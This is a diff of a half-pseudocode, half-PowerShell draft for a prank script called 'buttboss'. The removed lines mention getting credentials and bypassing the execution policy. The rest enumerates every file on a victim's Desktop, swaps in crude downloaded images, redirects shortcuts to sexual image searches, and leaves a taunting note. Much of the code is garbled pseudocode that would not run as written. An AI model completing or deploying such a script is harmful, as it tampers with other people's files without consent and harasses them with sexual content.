@@ -1,14 +1,10 @@
-# House keeping wrapper script that downloads current version of buttboss from github
-Get Credentials
-set -ep bypass 
-Download the script and create the Goofin directory
-Create goofin/butts goofin/cuts  
-
-
-# Script itself 
 # Enumerate targets
-Go to desktop and list all the files into an array called targets
-    for each target in targets 
+# Copy Desktop to Goofin for safe keeping
+Copy-Item -Path "$home\Desktop" -Destination "C:\Goofin\cuts" -Recurse 
+
+$targets = (gci $home\Desktop\ -Recurse) 
+for each $target in $targets
+
         Webrequest ImageSearch "juicy-ass-butt-%RANDOMNUMBER%"
         Save to goofin/butts directory as butt1.png, butt2.png, butt3.png 
         Cat butts dir and store in $butts 
@@ -21,7 +17,7 @@ Go to desktop and list all the files into an array called targets
             leave icon the same, just redirect link to open a google search for random butt search
 
 # Hit 'em with it
-cd Desktop  notepad buttboss.txt writefile "Now who's boss." 
+cd Desktop  notepad buttboss.txt writefile "Now who's boss."  
 
 
 
